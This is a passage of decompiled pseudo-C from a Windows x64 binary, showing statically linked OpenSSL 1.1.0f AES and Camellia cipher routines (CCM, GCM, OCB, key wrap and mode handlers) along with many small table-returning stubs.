  v17 = (void (__fastcall *)(__int64, __int64, unsigned __int64, __int64, char *, __int64))*((_QWORD *)v9 + 42);
  if ( v16 )
  {
    v19 = -1;
    if ( v17 )
      v20 = sub_1400933C0(v10, (__int64)a3, (__int64)a2, a4, v17);
    else
      v20 = sub_1400931E0(v10, a3, a2, a4);
    if ( v20
      || !sub_140093C50((unsigned __int8 *)v10, v23, (int)v9[67])
      || (v21 = (int)v9[67],
          v22 = __crt_stdio_input::format_string_parser<wchar_t>::scanset(a1),
          (unsigned int)sub_140023460(v23, v22, v21))
      || (v19 = a4, (_DWORD)a4 == -1) )
    {
      sub_140023440((__int64)a2, a4);
    }
    *(_QWORD *)(v9 + 63) = 0i64;
    result = v19;
    v9[65] = 0;
  }
  else
  {
    if ( v17 )
      v18 = sub_140093890(
              v10,
              (unsigned __int64)a3,
              (unsigned __int64)a2,
              a4,
              (void (__fastcall *)(unsigned __int64, unsigned __int64, unsigned __int64, __int64, char *, __int64))v17);
    else
      v18 = sub_1400935D0(v10, a3, a2, a4);
    if ( v18 )
      return 0xFFFFFFFFi64;
    v9[64] = 1;
    return (unsigned int)a4;
  }
  return result;
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140058A40) ----------------------------------------------------
__int64 __fastcall sub_140058A40(__FrameHandler3::TryBlockMap *a1, _DWORD *a2, const void *a3)
{
  __int64 v6; // rsi
  int v7; // eax
  int v8; // eax
  size_t NumTryBlocks; // rbx
  void *v10; // rax

  v6 = sub_140024D00((__int64)a1);
  if ( a3 )
  {
    if ( !a2 )
    {
LABEL_10:
      NumTryBlocks = (int)__FrameHandler3::TryBlockMap::getNumTryBlocks(a1);
      v10 = (void *)sub_140024D20((__int64)a1);
      memmove(v10, a3, NumTryBlocks);
      *(_QWORD *)(v6 + 248) = sub_140024D20((__int64)a1);
      return 1i64;
    }
  }
  else if ( !a2 )
  {
    return 1i64;
  }
  if ( (unsigned int)sub_140024CF0((__int64)a1) )
  {
    v7 = sub_140024D30((__int64)a1);
    sub_1400902A0(a2, 8 * v7, (unsigned int *)v6);
  }
  else
  {
    v8 = sub_140024D30((__int64)a1);
    sub_140090050(a2, 8 * v8, (unsigned int *)v6);
  }
  if ( a3 )
    goto LABEL_10;
  *(_QWORD *)(v6 + 248) = 0i64;
  return 1i64;
}

//----- (0000000140058B20) ----------------------------------------------------
__int64 __fastcall sub_140058B20(__FrameHandler3::TryBlockMap *a1, __int64 *a2, void *a3, unsigned __int64 a4)
{
  __int64 v8; // rdi
  BOOL v9; // r14d
  __int64 result; // rax
  int v11; // eax
  int *v12; // rdx
  unsigned __int64 v13; // rax
  unsigned __int64 v14; // rcx

  v8 = sub_140024D00((__int64)a1);
  v9 = __FrameHandler3::TryBlockMap::getNumTryBlocks(a1) == 4;
  if ( !a3 )
    return 0i64;
  if ( !a4 || !(unsigned int)sub_140024CF0((__int64)a1) && (a4 < 0x10 || (a4 & 7) != 0) || !v9 && (a4 & 7) != 0 )
    return 0xFFFFFFFFi64;
  if ( (unsigned int)sub_14001C310((__int64)a2, (__int64)a3, a4) )
  {
    sub_140024610(6, 170, 162, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_aes.c", 2250);
    return 0i64;
  }
  v11 = sub_140024CF0((__int64)a1);
  if ( a2 )
  {
    v12 = *(int **)(v8 + 248);
    if ( v9 )
    {
      if ( v11 )
        v13 = sub_140094290(v8, v12, a2, a3, a4, (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_14008FA50);
      else
        v13 = sub_140093FA0(v8, v12, a2, a3, a4, (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_14008F480);
    }
    else if ( v11 )
    {
      v13 = sub_140094120(
              v8,
              (__int64 *)v12,
              a2,
              a3,
              a4,
              (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_14008FA50);
    }
    else
    {
      v13 = sub_140093F00(
              v8,
              v12,
              (char *)a2,
              (__int64 *)a3,
              a4,
              (void (__fastcall *)(__int64 *, __int64 *, __int64))sub_14008F480);
    }
    v14 = v13;
    result = 0xFFFFFFFFi64;
    if ( v14 )
      return (unsigned int)v14;
  }
  else if ( v11 )
  {
    if ( v9 )
      a4 = (a4 + 7) & 0xFFFFFFFFFFFFFFF8ui64;
    return a4 + 8;
  }
  else
  {
    return a4 - 8;
  }
  return result;
}

//----- (0000000140058CB0) ----------------------------------------------------
__int64 __fastcall sub_140058CB0(__FrameHandler3::TryBlockMap *a1, int a2, int a3, void *a4)
{
  size_t v5; // rsi
  __int64 v8; // rax
  __int64 v9; // rbx
  int v10; // edi
  int v11; // edi
  int v12; // edi
  __int64 v14; // rax

  v5 = a3;
  v8 = sub_140024D00((__int64)a1);
  v9 = v8;
  if ( !a2 )
  {
    *(_QWORD *)(v8 + 496) = 0i64;
    *(_DWORD *)(v8 + 760) = __FrameHandler3::TryBlockMap::getNumTryBlocks(a1);
    *(_QWORD *)(v9 + 696) = sub_140024D20((__int64)a1);
    *(_DWORD *)(v9 + 764) = 16;
    *(_QWORD *)(v9 + 752) = 0i64;
    return 1i64;
  }
  v10 = a2 - 8;
  if ( !v10 )
  {
    v14 = sub_140024D00((__int64)a4);
    return sub_140094730(v14 + 504, v9 + 504, v14, v14 + 248);
  }
  v11 = v10 - 1;
  if ( !v11 )
  {
    if ( (unsigned int)(v5 - 1) <= 0xE )
    {
      *(_DWORD *)(v8 + 760) = v5;
      return 1i64;
    }
    return 0i64;
  }
  v12 = v11 - 7;
  if ( !v12 )
  {
    if ( (_DWORD)v5 == *(_DWORD *)(v8 + 764) && (unsigned int)sub_140024CF0((__int64)a1) )
    {
      memmove(a4, (const void *)(v9 + 704), v5);
      return 1i64;
    }
    return 0i64;
  }
  if ( v12 != 1 )
    return 0xFFFFFFFFi64;
  if ( a4 )
  {
    if ( (_DWORD)v5 == *(_DWORD *)(v8 + 764) && !(unsigned int)sub_140024CF0((__int64)a1) )
    {
      memmove((void *)(v9 + 704), a4, v5);
      return 1i64;
    }
    return 0i64;
  }
  if ( (unsigned int)v5 > 0x10 )
    return 0i64;
  *(_DWORD *)(v8 + 764) = v5;
  return 1i64;
}

//----- (0000000140058E10) ----------------------------------------------------
__int64 __fastcall sub_140058E10(__int64 a1, _DWORD *a2, const void *a3)
{
  __int64 v6; // rax
  __int64 v7; // rdi
  int v8; // eax
  int v9; // eax
  size_t v11; // r8

  v6 = sub_140024D00(a1);
  v7 = v6;
  if ( a3 )
  {
    if ( !a2 )
    {
      v11 = *(int *)(v6 + 760);
      if ( *(_DWORD *)(v6 + 496) )
        sub_140094F70(v6 + 504, a3, v11, *(int *)(v6 + 764));
      else
        memmove(*(void **)(v6 + 696), a3, v11);
      *(_DWORD *)(v7 + 500) = 1;
      return 1i64;
    }
  }
  else if ( !a2 )
  {
    return 1i64;
  }
  v8 = sub_140024D30(a1);
  sub_1400902A0(a2, 8 * v8, (unsigned int *)v7);
  v9 = sub_140024D30(a1);
  sub_140090050(a2, 8 * v9, (unsigned int *)(v7 + 248));
  if ( !(unsigned int)sub_140094DC0(
                        (_QWORD *)(v7 + 504),
                        v7,
                        v7 + 248,
                        (void (__fastcall *)(_QWORD *, _QWORD *, __int64))sub_14008FA50,
                        (__int64)sub_14008F480,
                        0i64) )
    return 0i64;
  if ( a3 || *(_DWORD *)(v7 + 500) && (a3 = *(const void **)(v7 + 696)) != 0i64 )
  {
    if ( (unsigned int)sub_140094F70(v7 + 504, a3, *(int *)(v7 + 760), *(int *)(v7 + 764)) != 1 )
      return 0i64;
    *(_DWORD *)(v7 + 500) = 1;
  }
  *(_DWORD *)(v7 + 496) = 1;
  return 1i64;
}

//----- (0000000140058F80) ----------------------------------------------------
__int64 __fastcall sub_140058F80(__int64 a1, __int64 a2, char *a3, size_t a4)
{
  unsigned int v5; // r14d
  int *v9; // rax
  void (__fastcall **v10)(__int64 *, __int64 *, __int64); // rbx
  char *v11; // r13
  int *v12; // r12
  __int64 v13; // rcx
  size_t v14; // rdi
  char *v15; // rcx
  int v17; // eax
  __int64 v18; // rcx
  size_t v19; // rdi
  int v20; // eax
  int v21; // eax
  __int64 v22; // rcx
  unsigned __int64 v23; // r9
  int v24; // eax
  unsigned __int64 v25; // r9
  __int64 v26; // rdx
  __int64 v27; // rcx

  v5 = 0;
  v9 = (int *)sub_140024D00(a1);
  v10 = (void (__fastcall **)(__int64 *, __int64 *, __int64))v9;
  if ( !v9[125] || !v9[124] )
    return 0xFFFFFFFFi64;
  if ( !a3 )
  {
    if ( v9[188] > 0 )
    {
      v24 = sub_140024CF0(a1);
      v25 = *((int *)v10 + 188);
      v26 = (__int64)(v10 + 90);
      v27 = (__int64)(v10 + 63);
      if ( v24 )
      {
        if ( !(unsigned int)sub_140094A90(v27, v26, a2, v25) )
          return 0xFFFFFFFFi64;
      }
      else if ( !(unsigned int)sub_140094830(v27, v26, a2, v25) )
      {
        return 0xFFFFFFFFi64;
      }
      v5 = *((_DWORD *)v10 + 188);
      *((_DWORD *)v10 + 188) = 0;
    }
    if ( *((int *)v10 + 189) > 0 )
    {
      if ( !(unsigned int)sub_140094530(v10 + 63, (__int64)(v10 + 92), *((int *)v10 + 189)) )
        return 0xFFFFFFFFi64;
      *((_DWORD *)v10 + 189) = 0;
    }
    if ( (unsigned int)sub_140024CF0(a1) )
    {
      if ( (unsigned int)sub_140095140((__int64)(v10 + 63), v10 + 88, 0x10ui64) != 1 )
        return 0xFFFFFFFFi64;
    }
    else if ( *((int *)v10 + 191) < 0
           || (unsigned int)sub_140094CF0((__int64)(v10 + 63), (__int64)(v10 + 88), *((int *)v10 + 191)) )
    {
      return 0xFFFFFFFFi64;
    }
    *((_DWORD *)v10 + 125) = 0;
    return v5;
  }
  if ( a2 )
  {
    v12 = v9 + 188;
    v11 = (char *)(v9 + 180);
    if ( (unsigned int)sub_14001C310(a2 + v9[188], (__int64)a3, a4) )
    {
      sub_140024610(6, 169, 162, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_aes.c", 2573);
      return 0i64;
    }
  }
  else
  {
    v11 = (char *)(v9 + 184);
    v12 = v9 + 189;
  }
  v13 = *v12;
  if ( (int)v13 > 0 )
  {
    v14 = (unsigned int)(16 - v13);
    v15 = &v11[v13];
    if ( v14 > a4 )
    {
      memmove(v15, a3, a4);
      *v12 += a4;
      return 0i64;
    }
    memmove(v15, a3, v14);
    a4 -= v14;
    a3 += v14;
    if ( a2 )
    {
      v17 = sub_140024CF0(a1);
      v18 = (__int64)(v10 + 63);
      if ( v17 )
      {
        if ( !(unsigned int)sub_140094A90(v18, (__int64)v11, a2, 0x10ui64) )
          return 0xFFFFFFFFi64;
      }
      else if ( !(unsigned int)sub_140094830(v18, (__int64)v11, a2, 0x10ui64) )
      {
        return 0xFFFFFFFFi64;
      }
    }
    else if ( !(unsigned int)sub_140094530(v10 + 63, (__int64)v11, 0x10ui64) )
    {
      return 0xFFFFFFFFi64;
    }
    *v12 = 0;
    v5 = 16;
    if ( a2 )
      a2 += 16i64;
  }
  v19 = a4 & 0xF;
  if ( a4 == v19 )
    goto LABEL_29;
  if ( !a2 )
  {
    v20 = sub_140094530(v10 + 63, (__int64)a3, a4 - v19);
    goto LABEL_23;
  }
  v21 = sub_140024CF0(a1);
  v22 = (__int64)(v10 + 63);
  v23 = a4 - v19;
  if ( v21 )
  {
    v20 = sub_140094A90(v22, (__int64)a3, a2, v23);
LABEL_23:
    if ( !v20 )
      return 0xFFFFFFFFi64;
    goto LABEL_28;
  }
  if ( !(unsigned int)sub_140094830(v22, (__int64)a3, a2, v23) )
    return 0xFFFFFFFFi64;
LABEL_28:
  v5 += a4 - v19;
  a3 += a4 - v19;
LABEL_29:
  if ( (a4 & 0xF) != 0 )
  {
    memmove(v11, a3, v19);
    *v12 = v19;
  }
  return v5;
}

//----- (0000000140059290) ----------------------------------------------------
__int64 __fastcall sub_140059290(__int64 a1)
{
  __int64 v1; // rax

  v1 = sub_140024D00(a1);
  sub_1400946E0(v1 + 504);
  return 1i64;
}

//----- (00000001400592C0) ----------------------------------------------------
__int64 __fastcall sub_1400592C0(__int64 a1, _DWORD *a2, __int64 a3, int a4)
{
  __int64 v7; // rbx
  __int64 v8; // rax
  int v9; // edi
  int v10; // eax
  int v11; // eax
  __int64 (__fastcall *v12)(_DWORD *, unsigned int *, unsigned int *); // rcx
  int v13; // eax
  void (__fastcall *v14)(char *, char *, unsigned __int64, __int64, char *, __int64); // rcx

  v7 = sub_140024D00(a1);
  v8 = sub_140021BD0(a1);
  v9 = sub_140024CF0(v8) & 0xF0007;
  if ( (unsigned int)(v9 - 1) > 1 || a4 )
  {
    v13 = sub_140024D30(a1);
    v11 = sub_1400902A0(a2, 8 * v13, (unsigned int *)v7);
    v12 = sub_14008FA50;
  }
  else
  {
    v10 = sub_140024D30(a1);
    v11 = sub_140090050(a2, 8 * v10, (unsigned int *)v7);
    v12 = sub_14008F480;
  }
  *(_QWORD *)(v7 + 248) = v12;
  v14 = 0i64;
  if ( v9 == 2 )
    v14 = sub_140090880;
  *(_QWORD *)(v7 + 256) = v14;
  if ( v11 >= 0 )
    return 1i64;
  sub_140024610(6, 133, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_aes.c", 1131);
  return 0i64;
}

//----- (00000001400593C0) ----------------------------------------------------
__int64 __fastcall sub_1400593C0(__int64 a1, char *a2, char *a3, unsigned __int64 a4)
{
  __int64 v8; // rsi
  int v9; // ebx
  __int64 v10; // rax
  _OWORD *v11; // rax
  char *v12; // rax

  v8 = sub_140024D00(a1);
  if ( *(_QWORD *)(v8 + 256) )
  {
    v9 = sub_140024CF0(a1);
    v10 = sub_140024D20(a1);
    (*(void (__fastcall **)(char *, char *, unsigned __int64, __int64, __int64, int))(v8 + 256))(
      a3,
      a2,
      a4,
      v8,
      v10,
      v9);
  }
  else if ( (unsigned int)sub_140024CF0(a1) )
  {
    v11 = (_OWORD *)sub_140024D20(a1);
    sub_140090B90(a3, a2, a4, v8, v11, *(void (__fastcall **)(char *, char *, __int64))(v8 + 248));
  }
  else
  {
    v12 = (char *)sub_140024D20(a1);
    sub_1400908C0(
      (__int64 *)a3,
      (__int64 *)a2,
      a4,
      v8,
      v12,
      *(void (__fastcall **)(__int64 *, __int64 *, __int64))(v8 + 248));
  }
  return 1i64;
}

//----- (00000001400594B0) ----------------------------------------------------
__int64 __fastcall sub_1400594B0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // rbp
  __int64 v9; // rdi
  unsigned __int64 v10; // rsi
  __int64 v11; // r15
  __int64 v12; // r14

  v8 = (int)sub_140024CD0(a1);
  v9 = sub_140024D00(a1);
  if ( a4 >= v8 )
  {
    v10 = a4 - v8;
    v11 = a2 - a3;
    v12 = -a3;
    do
    {
      (*(void (__fastcall **)(__int64, __int64, __int64))(v9 + 248))(a3, v11 + a3, v9);
      a3 += v8;
    }
    while ( v12 + a3 <= v10 );
  }
  return 1i64;
}

//----- (0000000140059540) ----------------------------------------------------
void *sub_140059540()
{
  return &unk_1400F93D0;
}

//----- (0000000140059550) ----------------------------------------------------
void *sub_140059550()
{
  return &unk_1400F9D90;
}

//----- (0000000140059560) ----------------------------------------------------
void *sub_140059560()
{
  return &unk_1400F9550;
}

//----- (0000000140059570) ----------------------------------------------------
void *sub_140059570()
{
  return &unk_1400F94F0;
}

//----- (0000000140059580) ----------------------------------------------------
void *sub_140059580()
{
  return &unk_1400F95B0;
}

//----- (0000000140059590) ----------------------------------------------------
void *sub_140059590()
{
  return &unk_1400F9610;
}

//----- (00000001400595A0) ----------------------------------------------------
void *sub_1400595A0()
{
  return &unk_1400F9430;
}

//----- (00000001400595B0) ----------------------------------------------------
void *sub_1400595B0()
{
  return &unk_1400F9BB0;
}

//----- (00000001400595C0) ----------------------------------------------------
void *sub_1400595C0()
{
  return &unk_1400FA0F0;
}

//----- (00000001400595D0) ----------------------------------------------------
void *sub_1400595D0()
{
  return &unk_1400F9490;
}

//----- (00000001400595E0) ----------------------------------------------------
void *sub_1400595E0()
{
  return &unk_1400F9EB0;
}

//----- (00000001400595F0) ----------------------------------------------------
void *sub_1400595F0()
{
  return &unk_1400F9FD0;
}

//----- (0000000140059600) ----------------------------------------------------
void *sub_140059600()
{
  return &unk_1400F9CD0;
}

//----- (0000000140059610) ----------------------------------------------------
void *sub_140059610()
{
  return &unk_1400F9670;
}

//----- (0000000140059620) ----------------------------------------------------
void *sub_140059620()
{
  return &unk_1400F9DF0;
}

//----- (0000000140059630) ----------------------------------------------------
void *sub_140059630()
{
  return &unk_1400F97F0;
}

//----- (0000000140059640) ----------------------------------------------------
void *sub_140059640()
{
  return &unk_1400F9790;
}

//----- (0000000140059650) ----------------------------------------------------
void *sub_140059650()
{
  return &unk_1400F9850;
}

//----- (0000000140059660) ----------------------------------------------------
void *sub_140059660()
{
  return &unk_1400F98B0;
}

//----- (0000000140059670) ----------------------------------------------------
void *sub_140059670()
{
  return &unk_1400F96D0;
}

//----- (0000000140059680) ----------------------------------------------------
void *sub_140059680()
{
  return &unk_1400F9C10;
}

//----- (0000000140059690) ----------------------------------------------------
void *sub_140059690()
{
  return &unk_1400FA150;
}

//----- (00000001400596A0) ----------------------------------------------------
void *sub_1400596A0()
{
  return &unk_1400F9730;
}

//----- (00000001400596B0) ----------------------------------------------------
void *sub_1400596B0()
{
  return &unk_1400F9F10;
}

//----- (00000001400596C0) ----------------------------------------------------
void *sub_1400596C0()
{
  return &unk_1400FA030;
}

//----- (00000001400596D0) ----------------------------------------------------
void *sub_1400596D0()
{
  return &unk_1400F9910;
}

//----- (00000001400596E0) ----------------------------------------------------
void *sub_1400596E0()
{
  return &unk_1400F9E50;
}

//----- (00000001400596F0) ----------------------------------------------------
void *sub_1400596F0()
{
  return &unk_1400F9A90;
}

//----- (0000000140059700) ----------------------------------------------------
void *sub_140059700()
{
  return &unk_1400F9A30;
}

//----- (0000000140059710) ----------------------------------------------------
void *sub_140059710()
{
  return &unk_1400F9AF0;
}

//----- (0000000140059720) ----------------------------------------------------
void *sub_140059720()
{
  return &unk_1400F9B50;
}

//----- (0000000140059730) ----------------------------------------------------
void *sub_140059730()
{
  return &unk_1400F9970;
}

//----- (0000000140059740) ----------------------------------------------------
void *sub_140059740()
{
  return &unk_1400F9C70;
}

//----- (0000000140059750) ----------------------------------------------------
void *sub_140059750()
{
  return &unk_1400FA1B0;
}

//----- (0000000140059760) ----------------------------------------------------
void *sub_140059760()
{
  return &unk_1400F99D0;
}

//----- (0000000140059770) ----------------------------------------------------
void *sub_140059770()
{
  return &unk_1400F9F70;
}

//----- (0000000140059780) ----------------------------------------------------
void *sub_140059780()
{
  return &unk_1400FA090;
}

//----- (0000000140059790) ----------------------------------------------------
void *sub_140059790()
{
  return &unk_1400F9D30;
}

//----- (00000001400597A0) ----------------------------------------------------
__int64 __fastcall sub_1400597A0(__int64 a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4)
{
  __int64 v8; // rax
  __int64 v9; // rsi
  char *v10; // rbp
  unsigned __int64 v11; // rdi
  unsigned __int64 v12; // rbx
  const void *v13; // rax
  unsigned __int64 v14; // rbx
  _BYTE *v15; // rax
  _QWORD *v16; // r15
  __int64 *v17; // r14
  bool v18; // zf
  void (__fastcall *v19)(__int64, __int64, unsigned __int64, __int64, char *, __int64); // rax
  int v20; // eax
  int v22; // eax
  char v23[16]; // [rsp+30h] [rbp-58h] BYREF

  v8 = sub_140024D00(a1);
  v9 = v8;
  v10 = (char *)(v8 + 280);
  if ( a2 != a3 || a4 < *(int *)(v8 + 268) + 8i64 )
    return 0xFFFFFFFFi64;
  if ( (unsigned int)sub_140024CF0(a1) )
    *a2 = *(_QWORD *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
  *(_QWORD *)(sub_140024D20(a1) + 4) = *a3;
  v11 = a4 - (*(_DWORD *)(v9 + 268) + 8);
  v12 = 15 - *(_DWORD *)(v9 + 264);
  v13 = (const void *)sub_140024D20(a1);
  if ( (unsigned int)sub_140093BA0(v10, v13, v12, v11) )
    return 0xFFFFFFFFi64;
  v14 = *(int *)(v9 + 272);
  v15 = (_BYTE *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
  sub_140093080((__int64)v10, v15, v14);
  v16 = a3 + 1;
  v17 = a2 + 1;
  v18 = (unsigned int)sub_140024CF0(a1) == 0;
  v19 = *(void (__fastcall **)(__int64, __int64, unsigned __int64, __int64, char *, __int64))(v9 + 336);
  if ( v18 )
  {
    if ( v19 )
      v22 = sub_1400933C0(v10, (__int64)v16, (__int64)v17, v11, v19);
    else
      v22 = sub_1400931E0(v10, v16, v17, v11);
    if ( !v22
      && sub_140093C50((unsigned __int8 *)v10, v23, *(int *)(v9 + 268))
      && !(unsigned int)sub_140023460(v23, (__int64)v16 + v11, *(int *)(v9 + 268)) )
    {
      return (unsigned int)v11;
    }
    sub_140023440((__int64)v17, v11);
    return 0xFFFFFFFFi64;
  }
  v20 = v19
      ? sub_140093890(
          v10,
          (unsigned __int64)v16,
          (unsigned __int64)v17,
          v11,
          (void (__fastcall *)(unsigned __int64, unsigned __int64, unsigned __int64, __int64, char *, __int64))v19)
      : sub_1400935D0(v10, v16, v17, v11);
  if ( v20 || !sub_140093C50((unsigned __int8 *)v10, (char *)v17 + v11, *(int *)(v9 + 268)) )
    return 0xFFFFFFFFi64;
  return v11 + *(unsigned int *)(v9 + 268) + 8i64;
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140059990) ----------------------------------------------------
__int64 __fastcall sub_140059990(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned int v8; // r12d
  __int64 v9; // rsi
  unsigned __int64 v10; // rbx
  char *v11; // rax
  _BYTE *v12; // r14
  unsigned __int64 v13; // rdi
  bool v14; // zf
  void (__fastcall *v15)(char *, _BYTE *, __int64, __int64, __int64); // rax
  char *v16; // rdx
  __int64 v17; // rcx
  int v18; // eax
  int v19; // eax
  void *v20; // rax
  char *v21; // rax
  __int64 result; // rax

  v8 = -1;
  v9 = sub_140024D00(a1);
  if ( a2 != a3 || a4 < 0x18 )
    return 0xFFFFFFFFi64;
  sub_140024CF0(a1);
  if ( (int)sub_14001B470(a1) > 0 )
  {
    v10 = *(int *)(v9 + 668);
    v11 = (char *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
    if ( !(unsigned int)sub_140091880(v9 + 256, v11, v10) )
    {
      v12 = (_BYTE *)(a2 + 8);
      v13 = a4 - 24;
      v14 = (unsigned int)sub_140024CF0(a1) == 0;
      v15 = *(void (__fastcall **)(char *, _BYTE *, __int64, __int64, __int64))(v9 + 672);
      v16 = (char *)(a3 + 8);
      v17 = v9 + 256;
      if ( v14 )
      {
        if ( v15 )
          v19 = sub_140091CE0(v17, v16, v12, v13, v15);
        else
          v19 = sub_1400919B0(v17, (__int64)v16, v12, v13);
        if ( !v19 )
        {
          v20 = (void *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
          sub_140092AB0(v9 + 256, v20, 0x10ui64);
          v21 = (char *)__crt_stdio_input::format_string_parser<wchar_t>::scanset(a1);
          if ( (unsigned int)sub_140023460(v21, v13 + a3 + 8, 16i64) )
            sub_140023440((__int64)v12, v13);
          else
            v8 = v13;
        }
      }
      else
      {
        if ( v15 )
          v18 = sub_1400922E0(v17, v16, v12, v13, v15);
        else
          v18 = sub_140091F90(v17, v16, v12, v13);
        if ( !v18 )
        {
          sub_140092AB0(v9 + 256, &v12[v13], 0x10ui64);
          v8 = v13 + 24;
        }
      }
    }
  }
  *(_DWORD *)(v9 + 252) = 0;
  result = v8;
  *(_DWORD *)(v9 + 668) = -1;
  return result;
}
// 140024CE0: using guessed type __int64 __fastcall __crt_stdio_input::format_string_parser<wchar_t>::scanset(_QWORD);

//----- (0000000140059B50) ----------------------------------------------------
__int64 __fastcall sub_140059B50(__int64 a1, unsigned __int8 *a2, __int64 a3, int a4)
{
  __int64 v7; // rdi
  int v8; // eax
  __int64 result; // rax
  __int64 v10; // rax
  int v11; // eax
  void *v12; // rcx
  void (__fastcall *v13)(char *, char *, unsigned __int64, __int64, char *, __int64); // rcx
  bool v14; // zf

  v7 = sub_140024D00(a1);
  v8 = sub_140024D30(a1);
  if ( (int)sub_1400954D0(a2, 8 * v8, (unsigned int *)v7) >= 0 )
  {
    v10 = sub_140021BD0(a1);
    v11 = sub_140024CF0(v10) & 0xF0007;
    if ( (unsigned int)(v11 - 1) > 1 || (v12 = sub_140095470, a4) )
      v12 = sub_1400954A0;
    *(_QWORD *)(v7 + 280) = v12;
    v13 = 0i64;
    v14 = v11 == 2;
    result = 1i64;
    if ( v14 )
      v13 = sub_140095530;
    *(_QWORD *)(v7 + 288) = v13;
  }
  else
  {
    sub_140024610(6, 159, 157, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\evp\\e_camellia.c", 221);
    return 0i64;
  }
  return result;
}

//----- (0000000140059C30) ----------------------------------------------------
__int64 __fastcall sub_140059C30(__int64 a1, char *a2, char *a3, unsigned __int64 a4)
{
  __int64 v8; // rsi
  int v9; // ebx
  __int64 v10; // rax
  _OWORD *v11; // rax
  char *v12; // rax

  v8 = sub_140024D00(a1);
  if ( *(_QWORD *)(v8 + 288) )
  {
    v9 = sub_140024CF0(a1);
    v10 = sub_140024D20(a1);
    (*(void (__fastcall **)(char *, char *, unsigned __int64, __int64, __int64, int))(v8 + 288))(
      a3,
      a2,
      a4,
      v8,
      v10,
      v9);
  }
  else if ( (unsigned int)sub_140024CF0(a1) )
  {
    v11 = (_OWORD *)sub_140024D20(a1);
    sub_140090B90(a3, a2, a4, v8, v11, *(void (__fastcall **)(char *, char *, __int64))(v8 + 280));
  }
  else
  {
    v12 = (char *)sub_140024D20(a1);
    sub_1400908C0(
      (__int64 *)a3,
      (__int64 *)a2,
      a4,
      v8,
      v12,
      *(void (__fastcall **)(__int64 *, __int64 *, __int64))(v8 + 280));
  }
  return 1i64;
}

//----- (0000000140059D20) ----------------------------------------------------
__int64 __fastcall sub_140059D20(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v8; // rbp
  __int64 v9; // rdi
  unsigned __int64 v10; // rsi
  __int64 v11; // r15
  __int64 v12; // r14

  v8 = (int)sub_140024CD0(a1);
  v9 = sub_140024D00(a1);
  if ( a4 >= v8 )
  {
    v10 = a4 - v8;
    v11 = a2 - a3;
    v12 = -a3;
    do
    {
      (*(void (__fastcall **)(__int64, __int64, __int64))(v9 + 280))(a3, v11 + a3, v9);
      a3 += v8;
    }
    while ( v12 + a3 <= v10 );
  }
  return 1i64;
}

//----- (0000000140059DB0) ----------------------------------------------------
__int64 __fastcall sub_140059DB0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v8; // rbx
  __int64 v9; // rax
  unsigned int v11[6]; // [rsp+40h] [rbp-18h] BYREF

  v8 = sub_140024D00(a1);
  v11[0] = sub_140024D40(a1);
  v9 = sub_140024D20(a1);
  sub_1400911D0(a3, a2, a4, v8, v9, v11, *(void (__fastcall **)(__int64, __int64, __int64))(v8 + 280));
  sub_140024D70(a1, v11[0]);
  return 1i64;
}
// 140059DB0: using guessed type unsigned int var_18[6];

//----- (0000000140059E60) ----------------------------------------------------
__int64 __fastcall sub_140059E60(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4)
{
  __int64 v8; // rdi
  int v9; // ebx
  __int64 v10; // rax
  unsigned int v12[10]; // [rsp+40h] [rbp-28h] BYREF

  v8 = sub_140024D00(a1);
  v12[0] = sub_140024D40(a1);
  v9 = sub_140024CF0(a1);
  v10 = sub_140024D20(a1);
  sub_1400915F0(a3, a2, a4, v8, v10, v12, v9, *(__int64 (__fastcall **)(__int64, __int64, __int64))(v8 + 280));
  sub_140024D70(a1, v12[0]);
  return 1i64;
}
// 140059E60: using guessed type unsigned int var_28[10];

//----- (0000000140059F10) ----------------------------------------------------
__int64 __fastcall sub_140059F10(__int64 a1, __int64 a2, char *a3, __int64 a4)
{
  __int64 v8; // rdi
  int v9; // ebx
  _OWORD *v10; // rax
  int v12; // [rsp+40h] [rbp-28h] BYREF

  v8 = sub_140024D00(a1);
  v12 = sub_140024D40(a1);
  v9 = sub_140024CF0(a1);
  v10 = (_OWORD *)sub_140024D20(a1);
  sub_140091520(a3, a2, a4, v8, v10, (int)&v12, v9, *(void (__fastcall **)(_OWORD *, _OWORD *, __int64))(v8 + 280));
  sub_140024D70(a1, v12);
  return 1i64;
}

//----- (0000000140059FC0) ----------------------------------------------------
__int64 __fastcall sub_140059FC0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  __int64 v8; // r14
  int v9; // ebx
  __int128 *v10; // rax
  unsigned __int64 v11; // r8
  unsigned __int64 v12; // rbp
  int v13; // ebx
  __int128 *v14; // rax
  int v16[4]; // [rsp+40h] [rbp-28h] BYREF

  v8 = sub_140024D00(a1);
  if ( (unsigned int)sub_140024D80(a1, 0x2000u) )
  {
    v16[0] = sub_140024D40(a1);
    v9 = sub_140024CF0(a1);
    v10 = (__int128 *)sub_140024D20(a1);
    v11 = a4;
LABEL_8:
    sub_140091340(
      a3,
      a2,
      v11,
      v8,
      v10,
      (int)v16,
      v9,
      *(void (__fastcall **)(__int128 *, __int128 *, __int64))(v8 + 280));
    sub_140024D70(a1, v16[0]);
    return 1i64;
  }
  if ( a4 >= 0x1000000000000000i64 )
  {
    v12 = a4 >> 60;
    a4 += 0xF000000000000000ui64 * (a4 >> 60);
    do
    {
      v16[0] = sub_140024D40(a1);
